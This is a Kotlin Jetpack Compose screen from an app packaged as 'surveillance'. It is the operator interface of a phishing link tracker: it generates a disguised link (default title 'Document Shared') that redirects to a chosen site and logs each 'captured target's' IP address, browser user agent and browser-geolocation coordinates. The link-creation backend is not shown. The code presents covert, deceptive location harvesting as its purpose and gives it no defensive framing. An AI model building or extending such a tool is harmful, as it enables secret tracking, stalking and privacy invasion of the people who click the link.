package com.egbe.surveillance.ui.screens

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.egbe.surveillance.ui.theme.EGBEAmber
import com.egbe.surveillance.ui.theme.EGBEGreen
import com.egbe.surveillance.ui.theme.EGBERed
import com.egbe.surveillance.ui.theme.EGBECyan
import com.egbe.surveillance.viewmodel.SurveillanceViewModel
import kotlinx.coroutines.delay

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun PhishingScreen(vm: SurveillanceViewModel) {
    var title by remember { mutableStateOf("Document Shared") }
    var redirect by remember { mutableStateOf("https://google.com") }
    val campaign = vm.phishingCampaign.value
    var polling by remember { mutableStateOf(false) }

    LaunchedEffect(campaign?.id, polling) {
        while (polling && campaign != null) {
            vm.refreshCampaign(campaign.id)
            delay(5000)
        }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(16.dp)
    ) {
        Text("LINK TRACKER", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 14.sp, color = EGBEAmber, letterSpacing = 2.sp)
        Spacer(modifier = Modifier.height(8.dp))
        Text("Generate a tracking link to discover target location via browser geolocation.", fontSize = 12.sp, color = androidx.compose.ui.graphics.Color(0xFF94A3B8))

        Spacer(modifier = Modifier.height(16.dp))

        OutlinedTextField(
            value = title,
            onValueChange = { title = it },
            label = { Text("PAGE TITLE") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = EGBEAmber, focusedLabelColor = EGBEAmber)
        )

        Spacer(modifier = Modifier.height(8.dp))

        OutlinedTextField(
            value = redirect,
            onValueChange = { redirect = it },
            label = { Text("REDIRECT URL") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = EGBEAmber, focusedLabelColor = EGBEAmber)
        )

        Spacer(modifier = Modifier.height(12.dp))

        Button(
            onClick = { vm.createPhishingLink(title, redirect) },
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(containerColor = EGBEAmber)
        ) {
            Text("GENERATE TRACKING LINK", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontWeight = FontWeight.Bold)
        }

        if (campaign != null) {
            Spacer(modifier = Modifier.height(24.dp))
            Text("CAMPAIGN ACTIVE", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 12.sp, color = EGBEGreen)

            Card(
                modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp),
                colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF1A2332)),
                border = androidx.compose.foundation.BorderStroke(1.dp, androidx.compose.ui.graphics.Color(0xFFFFFFFF).copy(alpha = 0.08f))
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text("URL", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 10.sp, color = androidx.compose.ui.graphics.Color(0xFF94A3B8))
                    Text(campaign.url, fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 12.sp, color = EGBECyan)
                    Spacer(modifier = Modifier.height(8.dp))
                    Text("CLICKS: ${campaign.clicks.size}", fontWeight = FontWeight.Bold, color = EGBEGreen)
                }
            }

            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                Button(
                    onClick = { polling = !polling },
                    colors = ButtonDefaults.buttonColors(containerColor = if (polling) EGBERed else EGBEGreen)
                ) {
                    Text(if (polling) "STOP POLLING" else "LIVE POLL", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 11.sp)
                }
            }

            Spacer(modifier = Modifier.height(16.dp))
            Text("CAPTURED TARGETS", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 11.sp, color = EGBEAmber)

            campaign.clicks.forEach { click ->
                Card(
                    modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
                    colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF111827))
                ) {
                    Column(modifier = Modifier.padding(12.dp)) {
                        Text("IP: ${click.ip}", fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, fontSize = 12.sp)
                        Text("UA: ${click.user_agent.take(40)}...", fontSize = 10.sp, color = androidx.compose.ui.graphics.Color(0xFF94A3B8))
                        if (click.lat != null && click.lon != null) {
                            Text("📍 ${click.lat}, ${click.lon} (±${click.accuracy}m)", fontSize = 12.sp, color = EGBEGreen)
                        } else {
                            Text("📍 Location denied by target", fontSize = 12.sp, color = EGBERed)
                        }
                        Text(click.timestamp, fontSize = 10.sp, color = androidx.compose.ui.graphics.Color(0xFF94A3B8))
                    }
                }
            }
        }
    }
}
